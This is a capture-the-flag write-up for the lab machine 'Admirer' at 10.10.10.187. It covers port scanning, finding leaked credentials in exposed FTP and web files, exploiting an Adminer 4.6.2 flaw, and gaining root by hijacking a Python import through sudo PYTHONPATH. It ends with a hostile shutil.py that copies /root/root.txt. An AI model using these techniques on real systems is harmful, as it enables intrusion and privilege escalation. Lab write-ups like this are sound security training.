# Admirer

Machine IP: 10.10.10.187

# Initial enumeration

```
nmap -sV -sC -T4 -v -oA fullscan 10.10.10.187
```

gives the following result:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
1078/tcp filtered avocent-proxy
1233/tcp filtered univ-appserver
4111/tcp filtered xgrid
9917/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Evidently `ssh` is not something we are going after. There is a `vsftpd 3.0.3` ftp server on port `21` and `Apache httpd 2.4.25 ((Debian))` on port 80.

# Port 21

The ftp server is a password protected server.

Grabbing ftp creds from `credentials.txt` file 

```s
[FTP account]
ftpuser
%n?4Wz}R$tTF7
```

log in to the ftp server to discover two files: `sql` file and one compressed folder of website files. Putting files to the server is not allowed. Transferring them using `get filename` in the ftp server and uncompressing the compressed files, I get a `index.php` from which I get some serverside code:

```php
<?php
    $servername = "localhost";
    $username = "waldo";
    $password = "]F7jLHw:*G>UPrTo}~A"d6b";
    $dbname = "admirerdb";

?>
```

Turns out there exists a `version 10.1.41-MariaDB` database `admirerdb` with username `waldo` and password `]F7jLHw:*G>UPrTo}~A"d6b` from which images are pulled and displayed on the main webpage. Moreover, we have extra info in `credentials.txt` and `contacts.txt`.

```s
credentials.txt

[Bank Account]
waldo.11
Ezy]m27}OREc$
```
## Utility scripts

Found certain utility scripts under `http://10.10.10.187:80/utility_scripts/xxx.php

`db_admin.php` is not something that is found on the server. It contains the following info:

```php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";
```

Why is `db_admin.php` not found? `db_admin.php` contains a note that  `// TODO: Finish implementing this or find a better open source alternative` implies the developer has shifted focus on some other open source tool. And that is `adminer`. A small work and `http://10.10.10.187:80/utility_scripts/adminer.php` is available.

# Port 80

URL: http://10.10.10.187:80

First thing is obviously to attack `dirbuster` with `*` extension. Found nothing interesting as yet. Some things found:

```
/images                             403
/icons                              403
/assets                             403
some JS scripts                     403
```

However, there is a `robots.txt` file:

```s
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

Trying to find it through URL leads to a forbidden directory. And maybe `waldo` is a user.

Running `wfuzz` leads to the following files: `contacts.txt` and `credentials.txt` inside `admin-dir/`

`contacts.txt`

```s
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

`credentials.txt`

```s
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Has a generic Not Found page giving away version information about the server `Apache/2.4.25 (Debian) `.

# Additional enumeration

```s
1078/tcp filtered avocent-proxy
1233/tcp filtered univ-appserver
4111/tcp filtered xgrid
```

Did a simple `nmap -p PORT 10.10.10.187` on these ports and all of them were reported to be closed.

# Adminer Exploitation (Foothold)

The `adminer` page is present on `http://10.10.10.187/utility-scripts/adminer.php`. It runs `Adminer 4.6.2` that asks for login. I tried the following:

```s
$servername = "localhost";  
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?";

$servername = "localhost";  
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
```

After a bit of playing around, MariaDB is MySQL (MariaDB is a fork of MySQL). There's a very [serious vulnerability](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) which I exploited to get `waldo` password as `&<h5b~yK3F#{PaPB&dA}{H>`. Logging into SSH works.

# Privilege escalation

Checking out `sudo -l` gives the following info: `(ALL) SETENV: /opt/scripts/admin_tasks.sh`. This is same as `admin_tasks.php` we had in the backup acquired from the ftp. The following tasks are possible:

```s
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)
```

Thus, we are now able to access the options 4-7. Entering `/var/www/html` is not allowed. So no point attacking there. Tried setting up a quick `SimpleHTTPServer` and transfering the password/shadow backup but to no avail. Moving to `/srv/ftp` is also permission denied. 

There are several users here in `/home`. All have a `user.txt` with same note `This is your home folder. Use it well`. Only `waldo` has the flag.

# Running linux privilege escalation

Interesting things to note:

- My SSH client gets recorded in the `SSH_CLIENT` and `SSH_CONNECTION`, which is interesting. So there is the log for SSH connections in the environment variables itself.

- Apparmor exists but nothing's there to suit MariaDB.

# Root privileges (Python import hijacking)

Post running a lot of stuff, found that the main script `admin_tasks.sh` (which runs as root) calls a python function on particular input (precisely while backing up web data). This python file calls `from shutil import make_archive`. All we needed to do was to hijack the import. But since the directory was not writable (as current directory is foremost in being searched for imports), we needed to modify the PATH.

Here's the catch, calling `export PATH=...` causes the path for `waldo` to be changed. Not root. Thus you need to update path as `sudo PYTHONPATH=/home/waldo/exp /opt/scripts/admin_tasks.sh`.

```py
# name this shutil.py in home/waldo/exp

def make_archive(a, b, c):
        fi = open("/root/root.txt", "r")
        d = fi.read()
        wr = open("./hey", "w")
        wr.write(d)